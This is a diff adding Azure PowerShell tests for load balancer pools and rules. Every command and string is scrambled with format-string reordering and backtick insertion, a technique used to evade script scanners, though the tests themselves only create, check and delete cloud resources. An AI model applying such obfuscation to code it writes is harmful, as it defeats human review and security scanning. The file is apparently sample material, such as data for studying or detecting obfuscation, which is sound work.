+        &("{1}{0}{4}{2}{3}{5}" -f'ert','Ass','ows','Co','-Thr','ntains') { &("{6}{9}{10}{3}{4}{0}{1}{11}{2}{7}{5}{12}{8}" -f 'rBa','c','nd','LoadBalanc','e','Po','Add','Address','Config','-A','z','ke','ol') -Name ${rNamE`A`dd} -LoadBalancer ${v`LOAdBala`N`c`ER} } ("{2}{0}{1}" -f 'eady ','exists','alr');
+
+        
+        ${V`lO`A`dbalA`NceR} = &("{1}{6}{2}{8}{0}{3}{5}{4}{7}"-f 'd','Re','AzLoadBalancerB','dre','PoolCo','ss','move-','nfig','ackendA') -LoadBalancer ${V`lO`ADBaL`AnCEr} -Name ${R`Nam`EAdd};
+        ${Vlo`AD`BAla`NceR} = &("{0}{9}{2}{8}{1}{6}{5}{4}{7}{3}{10}{11}" -f 'Remov','Bal','AzLo','ssPoolCo','d','ndAd','ancerBacke','re','ad','e-','nfi','g') -LoadBalancer ${vL`O`AdbAlA`Nc`er} -Name ${R`NAME};
+        
+        ${vlOA`d`B`AlAnc`eR} = &("{7}{5}{3}{0}{4}{2}{6}{8}{1}"-f 'cken','ig','es','a','dAddr','-AzLoadBalancerB','sPoolCon','Remove','f') -LoadBalancer ${vlo`A`DBA`la`NcER} -Name ${r`N`AMe};
+        
+        ${vLo`AD`B`AlanCER} = &("{3}{0}{2}{1}"-f '-Az','adBalancer','Lo','Set') -LoadBalancer ${V`Loadb`ALaN`CEr};
+        &("{1}{0}{3}{4}{2}"-f 'ssert-','A','ull','No','tN') ${vLOADb`ALanC`eR};
+
+        
+        &("{2}{1}{4}{5}{0}{3}{6}" -f 'Co','t','Asser','nt','-Th','rows','ains') { &("{0}{1}{4}{2}{7}{5}{3}{6}" -f 'Get-AzLo','a','lancerB','dress','dBa','endAd','PoolConfig','ack') -LoadBalancer ${vloa`DBalan`Cer} -Name ${rNa`mE} } ("{7}{6}{2}{0}{3}{5}{4}{1}"-f'g','ent','chin',' ','lem','e','o mat','Sequence contains n');
+    }
+    finally
+    {
+        
+        &("{3}{2}{0}{1}" -f'o','up','r','Clean-ResourceG') ${rGN`A`me};
+    }
+}
+
+
+function teSt-Loa`dBa`la`N`ciNgr`ULEcr`UDMiniM`Alp`AR`AmET`E`RS
+{
+    
+    ${R`gNAmE} = &("{3}{2}{4}{0}{1}"-f'ou','pName','e','Get-R','sourceGr');
+    ${rgL`OC`Ation} = &("{0}{3}{4}{5}{2}{6}{1}"-f 'Ge','cation','iderL','t-','P','rov','o') ("{1}{3}{4}{2}{0}" -f 'ement','R','ag','eso','urceMan');
+    ${R`N`AMe} = &("{2}{0}{1}" -f 'et-ResourceN','ame','G');
+    ${rN`A`mEADd} = "${rname}Add";
+    ${locA`Ti`On} = &("{2}{4}{1}{0}{3}" -f 'rL','e','Get-Pro','ocation','vid') ("{6}{7}{4}{5}{2}{8}{0}{9}{3}{1}"-f'd','ancers','.Network/l','al','croso','ft','M','i','oa','B');
+    
+    ${Pr`otocOL} = "Udp";
+    ${FROn`Ten`d`PorT} = 1024;
+    ${ba`c`kendP`orT} = 4096;
+    
+    ${PRO`T`oC`OlsEt} = "Tcp";
+    ${f`RoNTE`NDpORT`sET} = 1026;
+    ${b`A`ck`endpoRtset} = 4095;
+    
+    ${Pr`otO`Co`lAdD} = "Tcp";
+    ${frOn`TeNDPOR`T`A`DD} = 1025;
+    ${b`Ac`K`EndPor`Tadd} = 4094;
+    
+    ${SUB`NE`TNaME} = ("{2}{0}{3}{1}"-f 'ubne','ame','S','tN');
+    ${sUbNe`TA`D`DRes`spre`F`iX} = ("{2}{1}{0}" -f '4','0/2','10.0.1.');
+    ${v`iRtuaLn`E`T`w`ORknA`me} = ("{1}{0}{2}{3}{4}" -f'alNetw','Virtu','ork','N','ame');
+    ${Vir`TUaLne`TwoRkAD`dRESs`pREFiX} = @(("{2}{0}{1}" -f '0.','0.0.0/8','1'));
+    ${fR`ON`TENd`ipCoNf`i`gurATIo`NNa`Me} = ("{0}{4}{2}{1}{3}{5}"-f 'F','a','tendIPConfigur','tio','ron','nName');
+    ${bAc`KendA`ddREssPoO`lN`Ame} = ("{0}{4}{3}{1}{2}"-f'BackendAddressP','a','me','N','ool');
+    ${pRO`BE`N`AMe} = ("{0}{1}{2}"-f'P','robeNam','e');
+    ${P`RobEP`ORt} = 2424;
+    ${prOb`EINTERvAL`ins`ec`o`N`DS} = 6;
+    ${pROb`EPrOBECO`UNt} = 4;
+
+    try
+    {
+        ${R`es`OUr`CeG`ROup} = &("{4}{1}{5}{3}{0}{2}"-f 'G','w-Az','roup','rce','Ne','Resou') -Name ${Rg`N`AME} -Location ${rgLo`C`ATIon};
+
+        
+        ${s`UBnET} = &("{3}{6}{8}{4}{9}{5}{1}{7}{0}{2}" -f 'etCon','u','fig','N','ua','kS','ew-AzVir','bn','t','lNetwor') -Name ${s`Ub`N`ETnAme} -AddressPrefix ${sU`BN`etAdDRE`ssP`ReFIX};
+        ${V`IRTuAlNeT`W`ork} = &("{0}{2}{4}{1}{3}" -f 'New','irtua','-A','lNetwork','zV') -ResourceGroupName ${RG`NaME} -Location ${LO`ca`Tion} -Name ${vIRtualn`EtWOR`Kn`AmE} -Subnet ${s`UB`NET} -AddressPrefix ${virtUalnE`T`W`oR`k`A`DDREsS`PREfIx};
+        if(-not ${Su`B`NET}."id")
+        {
+            ${sU`Bn`ET} = &("{6}{7}{2}{1}{4}{5}{0}{3}" -f'n','irt','t-AzV','etConfig','ual','NetworkSub','G','e') -Name ${s`UB`NeT`NaME} -VirtualNetwork ${vir`Tu`AlneTworK};
+        }
+        ${Fr`on`TeNd`iPcONf`Igu`RaTI`On} = &("{10}{7}{8}{3}{5}{4}{9}{2}{6}{1}{0}"-f'onfig','ndIpC','Front','adBal','nc','a','e','w-','AzLo','er','Ne') -Name ${fR`Onte`N`DI`pConFig`UrAt`io`NnAme} -Subnet ${s`UB`NeT};
+        ${B`ACK`ENdaDDRE`SSPooL} = &("{2}{0}{5}{1}{7}{3}{8}{6}{4}" -f'w-AzLo','Ba','Ne','kend','ig','adBalancer','sPoolConf','c','Addres') -Name ${B`A`cKend`AD`D`ReSsp`oOLname};
+        ${pRO`Be} = &("{4}{2}{1}{6}{5}{7}{0}{8}{3}" -f 'ncerPro','ad','ew-AzLo','g','N','al','B','a','beConfi') -Name ${PR`oB`eNAMe} -Port ${P`RoBe`PORt} -IntervalInSeconds ${p`RO`BeI`N`TERvALINSECO`N`DS} -ProbeCount ${p`ROBepr`O`BeCOUNT};
+
+        
+        ${V`l`OAdB`ALancIn`GRuLe} = &("{4}{8}{3}{6}{7}{5}{1}{2}{0}"-f 'ig','Con','f','n','New-AzLoadBal','e','cerRu','l','a') -Name ${R`N`AmE} -FrontendIpConfiguration ${f`RON`TENDIpconFI`g`U`RatIon} -BackendAddressPool ${BA`ck`ENdAD`dr`es`SPOol} -Probe ${P`R`obE} -Protocol ${PR`ot`ocoL} -FrontendPort ${FRO`NTenD`POrt} -BackendPort ${BaC`KeNdp`Ort};
+        &("{3}{0}{2}{1}" -f '-NotN','l','ul','Assert') ${vL`oaDB`AL`A`NCInGrULe};
+        &("{2}{1}{0}{3}" -f 'u','-Tr','Assert','e') { &("{1}{6}{4}{0}{3}{5}{2}"-f 't','Che','pe','Retur','dle','nTy','ck-Cm') ("{0}{2}{4}{3}{1}" -f'N','fig','ew-AzLoadBalanc','n','erRuleCo') ${VLoad`BalaN`C`IngRule} };
+        ${VlOaDb`A`lANCER} = &("{0}{2}{1}{3}{4}"-f'New-','adBal','AzLo','a','ncer') -ResourceGroupName ${R`Gna`Me} -Name ${R`NA`ME} -LoadBalancingRule ${vlOA`D`BA`lan`ciN`GRULe} -FrontendIPConfiguration ${FRontEndIP`C`oN`FigURAT`I`ON} -BackendAddressPool ${Ba`CkenD`ADDr`es`sPo`oL} -Probe ${pr`O`Be} -Location ${lo`CA`TiON};
+        &("{2}{3}{0}{1}"-f 'ot','Null','As','sert-N') ${v`Lo`AdBa`lAnceR};
+        &("{2}{1}{0}{3}"-f 'N','t-Not','Asser','ull') ${Vlo`AD`BaLANCER}."FR`o`NTe`NDIP`c`ONFiG`UrAtIonS";
+        &("{0}{2}{1}" -f'Asse','-True','rt') { ${v`LoADbaLan`ceR}."FrOnTenDi`P`COnfIG`URAt`Io`NS"."lE`NGtH" -gt 0 };
+        &("{4}{3}{2}{1}{0}" -f'Null','ot','t-N','ser','As') ${vLO`A`DBa`LANCEr}."Ba`ckendADDrE`sSP`OoLs";
+        &("{3}{1}{2}{0}" -f 'rt-True','s','se','A') { ${vLo`AdBala`N`C`er}."baCKe`NdA`dDreSSp`oOls"."LE`N`GtH" -gt 0 };
+        &("{1}{2}{0}{3}" -f 'Nul','Asse','rt-Not','l') ${vLoa`DBAL`A`NCER}."P`RObeS";
+        &("{0}{1}{2}"-f'Ass','e','rt-True') { ${v`LoAD`Ba`lANcER}."P`ROBeS"."l`e`NGTH" -gt 0 };
+        &("{0}{1}{3}{4}{2}"-f 'Asser','t','al','-Ar','eEqu') ${rna`me} ${vL`o`ADbALa`NCIn`GRule}."nA`me";
+        &("{0}{3}{2}{1}" -f 'A','reEqual','ert-A','ss') ${P`ROTOC`ol} ${V`l`OADbALan`cin`g`RuLe}."pROtoc`Ol";
+        &("{2}{0}{3}{1}"-f'sert','ual','As','-AreEq') ${fro`N`TeNd`PoRt} ${VLOAd`B`ALaNCiNg`Ru`Le}."f`ROntENDp`o`Rt";
+        &("{1}{2}{4}{3}{0}" -f 'l','Asse','rt-Ar','ua','eEq') ${Back`eN`dpORt} ${VLO`Ad`BALANC`in`g`RULE}."b`ACkE`Ndp`orT";
+
+        
+        ${VlOaDb`A`LaN`cI`N`GRule} = &("{4}{3}{2}{5}{1}{0}" -f'fig','dBalancerRuleCon','Lo','t-Az','Ge','a') -LoadBalancer ${v`lO`AdBALa`Nc`eR} -Name ${R`NAmE};
+        &("{0}{2}{1}"-f'Ass','tNull','ert-No') ${V`lO`A`DbALANCiNGr`ULE};
+        &("{2}{1}{0}" -f'rue','T','Assert-') { &("{0}{3}{5}{4}{1}{2}"-f'Check-','urnTyp','e','CmdletR','t','e') ("{5}{0}{1}{8}{2}{4}{3}{6}{7}"-f'et','-Az','ala','Rule','ncer','G','C','onfig','LoadB') ${VLOad`BaLA`N`CiNg`Ru`Le} };
+        &("{4}{1}{2}{0}{3}" -f '-Ar','s','sert','eEqual','A') ${rnA`mE} ${v`load`BaLan`cIngr`ULe}."NA`mE";
+        &("{0}{4}{1}{2}{3}"-f 'A','A','reEqu','al','ssert-') ${Pro`T`OCol} ${VLoadbALaN`C`InGR`UlE}."P`RotoC`oL";
+        &("{3}{2}{1}{0}{4}" -f 't-Ar','er','ss','A','eEqual') ${fR`o`Nte`NdPORT} ${vloaDB`ALa`NC`InGrulE}."Fr`ONtEn`dpO`Rt";
+        &("{0}{1}{2}" -f 'A','ssert-AreEqu','al') ${bAC`kENDp`O`RT} ${vl`O`ADBalAnciNg`RUle}."bACk`e`NDPort";
+
+        
+        ${Li`st`LOADBA`La`N`CinG`RUle} = &("{5}{1}{4}{0}{6}{2}{3}" -f'e','ancerRu','nfi','g','l','Get-AzLoadBal','Co') -LoadBalancer ${vlO`ADBA`lAn`cer};
+        &("{4}{2}{1}{0}{3}"-f 'o','t-N','er','tNull','Ass') (${lI`StlOADB`A`lANCiNg`RU`le} | &("{2}{3}{1}{0}"-f't','Objec','Wher','e-') { ${_}."Na`ME" -eq ${r`NaME} });
+
+        
+        ${Vl`oADb`AL`An`CeR} = &("{3}{5}{6}{4}{2}{0}{7}{1}" -f 'rRul','g','alance','Set-AzL','B','o','ad','eConfi') -Name ${rn`A`mE} -LoadBalancer ${vlOA`D`BAlancer} -FrontendIpConfiguration ${frO`N`TeN`diPcO`NFigUrA`Ti`on} -BackendAddressPool ${bacK`e`ND`ADDr`eSsPOoL} -Probe ${pRO`BE} -Protocol ${prO`ToCOl`s`et} -FrontendPort ${fRo`NT`eNdpORT`SeT} -BackendPort ${BA`CK`endpoRt`sET};
+        &("{4}{3}{0}{2}{1}" -f'rt-N','ll','otNu','se','As') ${VlOA`Db`ALa`NcEr};
+        ${Vlo`AdbaLa`N`CeR} = &("{5}{1}{3}{0}{2}{4}" -f 'oadBalanc','et-Az','e','L','r','S') -LoadBalancer ${v`LoaD`BalaNCER};
+        &("{1}{2}{0}{3}"-f 'l','Assert-Not','Nu','l') ${VLO`AdbAlA`N`Cer};
+
+        
+        ${VL`oadbaL`ANCi`Ng`RULe} = &("{8}{7}{5}{0}{6}{3}{2}{4}{1}"-f 'dB','rRuleConfig','c','lan','e','oa','a','zL','Get-A') -LoadBalancer ${vload`BA`la`NCEr} -Name ${r`N`AMe};
+        &("{0}{2}{1}" -f'A','l','ssert-NotNul') ${VlOadbal`AnCI`NGr`ULE};
+        &("{1}{0}{2}" -f 't-T','Asser','rue') { &("{3}{0}{1}{2}"-f 'eck-Cmd','let','ReturnType','Ch') ("{1}{6}{2}{3}{5}{0}{7}{4}{8}" -f'lance','G','-','AzLoadB','onf','a','et','rRuleC','ig') ${v`lOAdBAlan`CinGR`Ule} };
+        &("{3}{0}{2}{1}"-f 'r','Equal','e','Assert-A') ${r`NAme} ${V`lO`A`dBala`NCiNGruLe}."n`Ame";
+        &("{2}{3}{1}{0}{4}"-f'eEq','t-Ar','Ass','er','ual') ${P`Rot`ocolSeT} ${VlOAD`B`A`lAN`cIn`GruLE}."P`R`OTOcOl";
+        &("{1}{2}{0}"-f 'qual','Asse','rt-AreE') ${F`RONteN`d`pORtSeT} ${VLOadBala`NC`InG`RuLE}."Fr`oNtEnD`pOrT";
+        &("{4}{3}{2}{0}{1}" -f'-AreE','qual','ert','s','As') ${bA`C`KenDP`OrtseT} ${VlOADb`AlA`N`CIng`R`ULE}."BA`cKeNdp`o`RT";
+
+        
+        ${ListlO`ADbal`An`ci`N`GRule} = &("{5}{2}{4}{6}{3}{0}{1}" -f'Confi','g','A','e','zLo','Get-','adBalancerRul') -LoadBalancer ${VLO`A`DbAl`A`NcEr};
+        &("{0}{1}{2}{3}{4}" -f 'Ass','ert-','NotN','ul','l') (${ListloA`DBALa`NCi`Ng`R`U`le} | &("{3}{0}{1}{2}"-f 'ere','-Obj','ect','Wh') { ${_}."N`AME" -eq ${rN`AmE} });
+
+        
+        ${vL`o`AD`B`AlaNcEr} = &("{1}{2}{3}{0}{4}" -f 'anc','Add-','AzLo','adBal','erRuleConfig') -Name ${r`N`AME`Add} -LoadBalancer ${vLoAD`B`ALaNc`eR} -FrontendIpConfiguration ${FROn`TEND`ipCo`NfiGUrATI`on} -BackendAddressPool ${baC`KE`N`DaDdR`eSSp`OoL} -Probe ${P`ROBE} -Protocol ${PrOTocol`A`dd} -FrontendPort ${frO`NtENd`PO`RtadD} -BackendPort ${bAckendPO`RT`A`DD};
+        &("{1}{0}{2}"-f'-','Assert','NotNull') ${VlOAdBA`la`NcER};
+        ${v`LOadBaLa`NC`eR} = &("{5}{2}{0}{4}{1}{3}"-f'oa','lance','-AzL','r','dBa','Set') -LoadBalancer ${V`l`Oa`Db`ALAncER};
+        &("{2}{0}{1}{4}{3}"-f 'sert-N','otN','As','ll','u') ${vl`oadBALaN`cER};
+
+        
+        ${VLoadbAl`AN`Cin`gR`Ule} = &("{3}{0}{1}{4}{2}" -f'oadBalan','cer','uleConfig','Get-AzL','R') -LoadBalancer ${vlo`ADBal`AN`cER} -Name ${r`Na`mEADd};
+        &("{2}{3}{4}{0}{1}" -f'u','ll','Assert-No','t','N') ${VL`OAD`BAL`A`NcIngR`Ule};
+        &("{2}{1}{0}" -f '-True','sert','As') { &("{3}{5}{1}{4}{2}{0}"-f'rnType','dlet','u','Check-','Ret','Cm') ("{1}{2}{4}{3}{0}"-f 'nfig','Get','-AzLoadBa','uleCo','lancerR') ${v`lOaD`BALanCIng`RUle} };
+        &("{2}{3}{0}{1}" -f'A','reEqual','Asse','rt-') ${r`NAMe`ADd} ${V`load`Balan`cI`N`G`RulE}."n`AME";
+        &("{3}{0}{4}{1}{2}"-f 'e','r','eEqual','Ass','rt-A') ${p`RoTOCO`lAdD} ${VL`oadbA`LA`NCiNgrule}."P`RotoCol";
+        &("{3}{0}{1}{2}"-f 't','-AreEqu','al','Asser') ${FRONTE`N`D`pOrt`ADd} ${VLOAd`BaL`ANCInG`R`U`Le}."Fr`oNTe`Ndpo`RT";
+        &("{1}{2}{0}{3}" -f'eE','Assert-A','r','qual') ${B`ACkENDPo`R`TAdD} ${Vlo`A`Db`A`la`NCingrule}."bAcke`N`D`pOrT";
+
+        
+        ${lIsT`lO`A`dBaLAN`CIngRuLe} = &("{6}{5}{0}{2}{4}{1}{3}" -f 'oadB','i','alance','g','rRuleConf','t-AzL','Ge') -LoadBalancer ${vL`oadB`A`lancer};
+        &("{1}{3}{0}{2}{4}"-f'tN','A','u','ssert-No','ll') (${LIst`lOADB`AlA`NCING`R`U`le} | &("{0}{2}{1}"-f'Wher','-Object','e') { ${_}."N`AME" -eq ${R`N`AMEADd} });
+
+        
+        &("{4}{0}{3}{1}{2}" -f '-T','rowsCon','tains','h','Assert') { &("{0}{3}{5}{4}{2}{6}{1}" -f'Add-','nfig','Ru','Az','oadBalancer','L','leCo') -Name ${R`Na`mEADd} -LoadBalancer ${vl`OAD`B`Al`ANcER} -FrontendIpConfiguration ${fRoNt`enDip`co`NF`iGu`Ration} -BackendAddressPool ${BackENDa`D`Dres`S`p`ooL} -Probe ${pR`oBE} -Protocol ${PRot`oco`laDd} -FrontendPort ${FRon`TEnDpo`R`T`ADd} -BackendPort ${bACKEn`dPORt`ADd} } ("{3}{1}{4}{0}{2}"-f 'dy e','e','xists','alr','a');
+
+        
+        ${VlOa`DBAL`A`Nc`ER} = &("{5}{3}{4}{1}{6}{0}{2}" -f 'rRule','anc','Config','e-AzLoad','Bal','Remov','e') -LoadBalancer ${V`lOaDBal`ANCer} -Name ${R`Name`ADd};
+        ${Vl`oaDB`ALAN`ceR} = &("{2}{7}{6}{4}{3}{5}{1}{0}"-f 'ig','eConf','R','r','nce','Rul','adBala','emove-AzLo') -LoadBalancer ${vLOAd`B`A`lAn`cer} -Name ${R`N`AmE};
+        
+        ${VLO`AD`BALAN`CER} = &("{8}{9}{0}{2}{5}{4}{7}{6}{3}{1}"-f 'e','eConfig','-Az','l','n','LoadBala','erRu','c','R','emov') -LoadBalancer ${vLoA`DbAl`AN`C`ER} -Name ${r`NAmE};
+        
+        ${V`lO`Adbalanc`eR} = &("{1}{2}{0}{3}" -f'anc','Set-AzL','oadBal','er') -LoadBalancer ${VlOA`DBALAn`cEr};
+        &("{0}{1}{3}{2}"-f 'Asse','rt-','l','NotNul') ${VlOA`D`B`ALAN`CEr};
+
+        
+        &("{2}{1}{4}{3}{0}"-f's','se','As','wsContain','rt-Thro') { &("{4}{8}{1}{0}{3}{6}{7}{5}{2}"-f 'a','zLo','ig','dB','Ge','ncerRuleConf','a','la','t-A') -LoadBalancer ${vLoa`DBA`LA`NceR} -Name ${RnA`ME} } ("{0}{4}{5}{1}{3}{6}{7}{2}" -f'Sequ','no ma','lement','tch','ence conta','ins ','in','g e');
+
+        
+        &("{2}{1}{4}{5}{3}{0}" -f'tains','ser','As','wsCon','t-Th','ro') { &("{1}{2}{6}{3}{4}{0}{7}{5}{8}" -f'ncer','Set-','AzL','Bal','a','f','oad','RuleCon','ig') -Name ${RNa`Me} -LoadBalancer ${VloAd`Ba`l`AnCER} -FrontendIpConfiguration ${frontenD`iP`coNf`I`Gur`ATION} -BackendAddressPool ${ba`Ck`en`daDD`R`esSp`OOL} -Probe ${PR`O`Be} -Protocol ${PR`O`T`ocOLseT} -FrontendPort ${fRO`N`T`end`POrtseT} -BackendPort ${baC`KENDp`o`R`TSET} } ("{1}{2}{3}{0}" -f ' exist','do','es n','ot');
+    }
+    finally
+    {
+        
+        &("{0}{1}{3}{2}{4}" -f 'Cl','e','sourc','an-Re','eGroup') ${RGN`A`me};
+    }
+}
+
+
+function test-LoA`dbA`L`ANCINGrul`EC`RuD`ALlPARAMETeRS
+{
+    
+    ${R`gnAMe} = &("{3}{0}{4}{1}{2}"-f 't-Reso','eGr','oupName','Ge','urc');
+    ${rG`locAt`ION} = &("{2}{3}{5}{0}{6}{4}{1}" -f 'rov','tion','G','e','derLoca','t-P','i') ("{4}{2}{1}{3}{0}"-f'nagement','M','rce','a','Resou');
+    ${rna`mE} = &("{4}{3}{2}{0}{1}" -f'rceNam','e','esou','t-R','Ge');
+    ${RN`A`mEADD} = "${rname}Add";
+    ${l`OCa`TIon} = &("{3}{2}{1}{0}" -f 'ation','c','iderLo','Get-Prov') ("{7}{8}{4}{6}{0}{2}{5}{3}{1}"-f 'twor','ers','k/load','anc','ro','Bal','soft.Ne','Mi','c');
+    
+    ${PR`o`TOCOl} = "Udp";
+    ${LoADD`iSt`R`iButiOn} = ("{0}{1}"-f'Def','ault');
+    ${f`ROnTENdPo`RT} = 1024;
+    ${B`AcKenDP`o`RT} = 4096;
+    ${IDLe`TImeou`TiNmin`U`T`es} = 5;
+    ${enaB`lE`FlOATiNG`IP} = ${t`RuE};
+    ${Ena`Blet`cprESEt} = ${fal`se};
+    
+    ${P`ROtoC`OLSET} = "Tcp";
+    ${l`O`AD`dIS`Tr`i`BUTIONsEt} = ("{1}{0}{2}" -f 'rc','Sou','eIP');
+    ${FRON`T`EndPOrT`seT} = 1026;
+    ${b`AcKen`DpORt`seT} = 4095;
+    ${i`dletiMEo`UT`iNmI`Nut`eSS`et} = 29;
+    ${E`Na`BlEflOAtI`N`GIPsEt} = ${f`AL`Se};
+    ${ENab`lETCP`Re`S`ET`sET} = ${FA`lsE};
+    
+    ${PROtoCoL`A`dD} = "Tcp";
+    ${lOAdd`ist`R`IBUt`IonADd} = ("{2}{3}{0}{1}" -f 'Protoc','ol','So','urceIP');
+    ${fRO`NTENDpOrT`ADd} = 1025;
+    ${BaCKE`NDpoR`TADD} = 4094;
+    ${i`Dl`eTIME`oUTi`NMIN`Ut`esa`Dd} = 7;
+    ${E`Na`B`LeFL`oAtiNGIpadD} = ${F`ALSe};
+    ${ENa`B`l`EtcPReS`etaDd} = ${FaL`se};
+    
+    ${s`UBne`TNaME} = ("{1}{2}{0}" -f'e','Subnet','Nam');
+    ${SUBNEt`A`DDr`E`ssPREfix} = ("{3}{0}{1}{2}"-f'0.0.1.0','/2','4','1');
+    ${V`iRT`UAlNEtWOr`kNamE} = ("{5}{3}{1}{4}{0}{2}"-f 'm','lNe','e','rtua','tworkNa','Vi');
+    ${vir`TUAlNeTW`oRK`ADd`RE`sSpreFiX} = @(("{2}{0}{1}"-f'0','/8','10.0.0.'));
+    ${f`Ro`Nt`eND`ipc`oNFIguratio`NnaMe} = ("{0}{1}{4}{3}{2}{5}" -f 'Fr','o','nNa','uratio','ntendIPConfig','me');
+    ${b`AckenDAd`DresS`PoOLname} = ("{3}{1}{2}{0}{4}{5}"-f 'ress','ckendA','dd','Ba','PoolN','ame');
+    ${PR`oBE`Name} = ("{2}{1}{3}{0}"-f'ame','rob','P','eN');
+    ${pr`obEp`O`RT} = 2424;
+    ${pRobe`i`N`TERV`AlINSECoNdS} = 6;
+    ${PrO`BEp`RObECOunT} = 4;
+
+    try
+    {
+        ${RE`soUr`cEg`Roup} = &("{1}{5}{3}{2}{4}{0}{6}"-f'u','N','rce','-AzResou','Gro','ew','p') -Name ${R`g`Name} -Location ${RgL`oCaTI`ON};
+
+        
+        ${S`UB`Net} = &("{7}{4}{3}{0}{2}{5}{1}{9}{6}{8}" -f'w','ubn','o','rtualNet','AzVi','rkS','tC','New-','onfig','e') -Name ${SU`Bn`etNaMe} -AddressPrefix ${SuBn`ETADDR`es`SpreF`IX};
+        ${VIRt`U`AlnETWo`Rk} = &("{4}{3}{2}{5}{0}{1}"-f 'al','Network','ir','-AzV','New','tu') -ResourceGroupName ${RGN`AMe} -Location ${LOc`A`TiON} -Name ${ViR`Tu`A`Ln`EtwoRkNa`mE} -Subnet ${su`B`NeT} -AddressPrefix ${vIrTUaLneTwoRKa`dDRe`SS`p`Re`FiX};
+        if(-not ${s`UBNEt}."iD")
+        {
+            ${SuB`N`ET} = &("{6}{1}{2}{7}{0}{4}{5}{3}"-f 'Ne','-','AzVirt','onfig','tworkSubnet','C','Get','ual') -Name ${S`Ub`NeTNAMe} -VirtualNetwork ${VIrtu`ALn`Etw`orK};
+        }
+        ${froN`T`eNdiPcoNfI`GU`R`AtIOn} = &("{7}{3}{6}{0}{4}{2}{1}{8}{5}"-f'lance','rontendIpCo','F','-AzLo','r','fig','adBa','New','n') -Name ${FROn`T`E`ND`Ip`c`oNfIGUrAtIoNn`A`mE} -Subnet ${s`UBNET};
+        ${B`Acken`da`dd`ResspOoL} = &("{11}{6}{1}{5}{10}{2}{7}{9}{0}{8}{3}{4}"-f'A','w-AzLo','er','ress','PoolConfig','adB','e','Backe','dd','nd','alanc','N') -Name ${B`A`CKE`N`Da`ddreSSPoo`lnamE};
+        ${P`Robe} = &("{6}{0}{8}{4}{5}{3}{2}{1}{7}" -f'-AzLoad','f','n','obeCo','cerP','r','New','ig','Balan') -Name ${proB`ENA`Me} -Port ${P`RoBe`port} -IntervalInSeconds ${Pro`BEinTEr`Val`i`N`sEcO`Nds} -ProbeCount ${prob`EpRo`BE`cO`Unt};
+
+        
+        ${vl`oAdB`ALA`N`C`in`gRuLE} = &("{4}{6}{7}{2}{3}{5}{1}{0}" -f'ig','f','ancerR','uleCo','New-','n','AzLoad','Bal') -Name ${RNa`mE} -FrontendIpConfiguration ${FR`oN`TenDipcONf`i`GuRa`Ti`On} -BackendAddressPool ${bAc`ke`Nda`DdreSSp`OOl} -Probe ${PR`o`BE} -Protocol ${P`RO`TOC`oL} -LoadDistribution ${lOa`dd`ISTri`B`UT`Ion} -FrontendPort ${FrO`Nt`e`NDPorT} -BackendPort ${BA`CkEN`dPO`Rt} -IdleTimeoutInMinutes ${idLe`TiMEOU`TInm`INuteS} -EnableFloatingIP;
+        &("{1}{3}{4}{2}{0}"-f 'ull','A','t-NotN','ss','er') ${VLoAdB`Al`A`NcingR`ULE};
+        &("{2}{0}{1}{3}" -f 'sse','rt','A','-True') { &("{2}{4}{1}{3}{0}"-f 'pe','urn','Check-CmdletR','Ty','et') ("{2}{5}{0}{1}{3}{4}"-f 'Loa','dBalan','Ne','cer','RuleConfig','w-Az') ${Vlo`Ad`Ba`LAnCIN`g`RULe} };
+        ${V`loADBa`laNc`er} = &("{0}{1}{2}{5}{3}{4}" -f 'N','ew','-AzLoadBal','n','cer','a') -ResourceGroupName ${r`Gn`AME} -Name ${rNA`mE} -LoadBalancingRule ${Vl`O`ADBALAnci`NG`R`ULe} -FrontendIPConfiguration ${FrontEndI`PCONF`I`G`U`RAti`ON} -BackendAddressPool ${ba`Cke`NdA`D`D`REssPool} -Probe ${pR`obe} -Location ${lOca`T`i`oN};
+        &("{4}{0}{3}{1}{2}"-f'sser','otNu','ll','t-N','A') ${V`load`B`A`laNcER};
+        &("{1}{0}{2}"-f'tN','Assert-No','ull') ${VL`OADBA`L`AN`cEr}."Fron`TEn`dI`Pco`NfIG`URATIONS";
+        &("{2}{0}{1}"-f'sert-','True','As') { ${v`l`OadBa`l`AncER}."fROnT`EnDiPCOnF`iGUrA`TIO`Ns"."le`NG`TH" -gt 0 };
+        &("{0}{2}{1}" -f 'As','ll','sert-NotNu') ${VL`OAD`BaLAnC`Er}."b`ACKENDAddR`ES`sPools";
+        &("{1}{2}{0}" -f 'ert-True','As','s') { ${VL`o`ADbA`lANCer}."b`ACKEnd`AdD`Re`s`SPools"."LE`Ngth" -gt 0 };
+        &("{1}{0}{3}{2}"-f 's','As','otNull','ert-N') ${v`LOa`DBaLa`NcER}."PrOB`eS";
+        &("{2}{0}{3}{1}" -f'ss','-True','A','ert') { ${v`LOa`dB`ALA`NCer}."prO`B`es"."lEn`GTH" -gt 0 };
+        &("{0}{2}{3}{1}"-f'Ass','ual','ert-','AreEq') ${r`Na`mE} ${V`Loa`DBaLaN`cInGr`ULE}."nA`mE";
+        &("{4}{1}{3}{0}{2}" -f 'ua','ssert-Ar','l','eEq','A') ${pr`Ot`OcOL} ${V`loaDb`A`l`A`NCiN`GRUlE}."pr`oT`OcOl";
+        &("{0}{4}{1}{3}{2}"-f 'A','t-AreE','l','qua','sser') ${lO`ADdISTr`Ibu`T`ioN} ${vL`OaDb`ALaNci`NGRuLe}."loa`DdIS`TrIbutiOn";
+        &("{3}{1}{2}{0}"-f'qual','sert-','AreE','As') ${f`RONten`DPOrt} ${vlo`Ad`B`A`LA`NCINg`RULE}."fR`ONTEND`P`OrT";
+        &("{0}{2}{1}{4}{3}" -f 'Asser','eEq','t-Ar','l','ua') ${B`AckeND`pO`RT} ${v`LoA`DBAl`ANCI`NG`RULE}."ba`c`kEndPoRt";
+        &("{1}{3}{0}{2}"-f'-AreEqu','Asser','al','t') ${iDl`eTiM`eOutInMinuT`es} ${vL`oadba`lan`CI`NG`RULE}."IDLeT`I`MeO`UtinMI`Nu`Tes";
+        &("{0}{1}{2}"-f 'Assert-','AreEqu','al') ${e`NaBle`FLOa`TiNGiP} ${vlOa`Db`ALan`CI`NgR`Ule}."EN`Ablef`lOa`TIN`G`Ip";
+        &("{0}{3}{1}{2}"-f 'A','Equa','l','ssert-Are') ${En`A`BLe`TcPReseT} ${V`loADBA`lA`Ncin`G`Ru`Le}."EnA`B`lETCP`ReSEt";
+
+        
+        ${VLOadba`LA`NcI`NGruLE} = &("{3}{4}{0}{2}{1}"-f 'l','fig','eCon','Ge','t-AzLoadBalancerRu') -LoadBalancer ${V`L`oAdbalaNC`eR} -Name ${R`NamE};
